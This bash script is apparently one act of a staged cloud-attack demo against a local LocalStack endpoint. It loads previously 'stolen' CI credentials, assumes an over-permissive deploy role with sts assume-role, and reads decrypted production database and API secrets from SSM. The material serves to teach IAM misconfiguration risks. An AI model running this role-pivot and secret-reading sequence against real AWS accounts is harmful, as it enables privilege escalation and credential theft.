#!/usr/bin/env bash
# Act 3 of the attack: lateral movement.
#
# Story: the leaked CI identity is trusted by the deploy role, whose policy
# is a wildcard catch-all. The attacker assumes the role and reads the
# production secrets with it.
#
# Runs against the demo endpoint only (scripts/check/ports-and-secrets.sh
# enforces that). `make attack` must run act 1 first: this script uses the
# credentials that act extracted.
set -euo pipefail
here="$(cd "$(dirname "$0")" && pwd)"
repo="$(cd "$here/../.." && pwd)"
ENDPOINT=http://localhost:4566
ROLE_ARN=arn:aws:iam::000000000000:role/acme-shop-deploy
CREDENV="$here/../act1/.stolen-creds.env"

fail() { echo "FAIL $*"; exit 1; }

echo "act 3: lateral movement"
echo
echo "1. the door, as merged: the deploy role's catch-all policy"
grep -B2 -A3 'Action   = "\*"' "$repo/scenarios/vulnerable/iam.tf" | sed 's/^/    /'

echo
echo "2. the stolen CI credentials"
test -s "$CREDENV" || fail "no stolen credentials; run make attack first"
# shellcheck source=/dev/null
set -a
source "$CREDENV"
set +a
export AWS_REGION=us-east-1
echo "OK  using the leaked identity from act 1 (.stolen-creds.env)"

echo
echo "3. assume the deploy role via its trust path"
creds=$(aws --endpoint-url "$ENDPOINT" sts assume-role \
  --role-arn "$ROLE_ARN" --role-session-name attacker-pivot \
  --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
  --output text 2>/dev/null | tr '\t' '\n') \
  || fail "sts assume-role failed"
read -r AKID < <(echo "$creds")
export AWS_ACCESS_KEY_ID=$AKID
export AWS_SECRET_ACCESS_KEY=$(echo "$creds" | sed -n 2p)
export AWS_SESSION_TOKEN=$(echo "$creds" | sed -n 3p)
echo "OK  role assumed; the CI identity's trust path leads to the deploy role"

echo
echo "4. read production secrets under the deploy role"
prod=$(aws --endpoint-url "$ENDPOINT" ssm get-parameters \
  --names "/prod/acme-shop/db_password" "/prod/acme-shop/api_key" \
  --with-decryption --output json 2>/dev/null) \
  || fail "ssm get-parameters failed"
dbval=$(grep '^db_password' "$repo/scenarios/vulnerable/localstack.tfvars" | cut -d'"' -f2)
apikey=$(grep '^api_key' "$repo/scenarios/vulnerable/localstack.tfvars" | cut -d'"' -f2)
echo "$prod" | jq -e --arg db "$dbval" --arg key "$apikey" \
  '(.Parameters | length) == 2 and
   any(.Parameters[]; .Value == $db) and
   any(.Parameters[]; .Value == $key)' >/dev/null \
  || fail "production secrets missing or not the live values"
echo "    read /prod/acme-shop/db_password = $dbval"
echo "    read /prod/acme-shop/api_key     = $apikey"
echo "OK  production secrets read as the deploy role"
exit 0